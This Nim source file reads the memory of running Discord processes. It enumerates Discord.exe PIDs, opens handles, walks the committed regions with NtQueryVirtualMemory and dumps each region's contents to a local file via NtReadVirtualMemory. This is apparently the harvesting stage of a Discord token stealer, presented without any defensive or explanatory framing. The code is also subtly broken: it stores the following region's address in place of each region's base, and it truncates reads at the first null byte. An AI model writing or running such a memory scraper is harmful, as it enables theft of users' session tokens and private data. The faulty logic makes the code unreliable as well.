import utils/dump, winim

type
    MEMORY_INFORMATION_CLASS = enum
      MemoryBasicInformation
type
    Region = object
     hProc: HANDLE
     address: PVOID
     length: SIZE_T

proc NtQueryVirtualMemory(
    ProcessHandle: HANDLE,
    BaseAddress: PVOID,
    MemoryInformationClass : MEMORY_INFORMATION_CLASS,
    MemoryInformation: PVOID,
    MemoryInformationLength: SIZE_T,
    ReturnLength: PSIZE_T
): NTSTATUS {.importc, dynlib: "ntdll", stdcall.}

proc NtReadVirtualMemory(
    ProcessHandle: HANDLE,
    BaseAddress: PVOID,
    Buffer: PVOID,
    NumberOfBytesToRead: ULONG,
    NumberOfBytesReaded: PULONG
): NTSTATUS {.importc, dynlib: "ntdll", stdcall.}

let pids = findProcessPIDS("Discord.exe")

var regions : seq[Region]
if pids.len <= 0:
    echo("[-] Discord Process Not Found.")
    quit(-1)

for pid in pids:
    let hProc = getHandleNatively(pid)
    if hProc == INVALID_HANDLE_VALUE or hProc == 0:
        continue
    echo("[+] Handle -> " & $hProc)
    # query memory
    var memInfo : MEMORY_BASIC_INFORMATION
    var address : PVOID = nil
    var returned : SIZE_T = 0
    while NtQueryVirtualMemory(hProc, address, MemoryBasicInformation, &memInfo, (sizeof(memInfo)*30).SIZE_T, &returned) == 0:
        address = cast[PVOID](cast[DWORD_PTR](memInfo.BaseAddress) + memInfo.RegionSize)
        #echo(memInfo.BaseAddress.repr)
        #and (memInfo.Protect and PAGE_GUARD) != PAGE_GUARD
        if memInfo.State == MEM_COMMIT:
            regions.add(Region(
                hProc: hProc,
                address: address,
                length: memInfo.RegionSize
            ))
let file = open("./dmp.txt" , fmAppend)
echo(regions.len)
for region in regions:
    var
        hProc = region.hProc
        address = region.address
        length = region.length
    var buffer: PVOID = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, length)
    let status = NtReadVirtualMemory(hProc, address , buffer,length.ULONG, cast[PULONG](NULL))
    if status == STATUS_SUCCESS:
        let buffer_str = $(cast[LPCSTR](buffer))
        #echo(buffer_str)
        file.write(buffer_str)




